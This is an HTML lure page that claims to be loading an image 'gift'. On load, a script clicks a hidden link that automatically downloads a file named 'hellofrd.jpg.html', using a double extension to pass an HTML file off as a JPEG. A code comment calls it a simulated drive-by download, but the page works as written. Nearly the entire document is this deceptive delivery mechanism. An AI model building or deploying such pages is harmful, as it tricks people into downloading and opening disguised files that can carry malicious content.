<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Image...</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f4f4f4; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h2>Loading your gift...</h2>
    <div class="loader"></div>
    <p>If the download doesn't start automatically, <a href="hellofrd.jpg.html" download="hellofrd.jpg.html">click here</a>.</p>

    <!-- Hidden link for auto-download -->
    <a id="auto-download" href="hellofrd.jpg.html" download="hellofrd.jpg.html" style="display:none;"></a>

    <script>
        // Simulate a "Drive-by Download"
        window.onload = function() {
            setTimeout(function() {
                document.getElementById('auto-download').click();
            }, 1000); // Wait 1 second before downloading
        };
    </script>
</body>
</html>
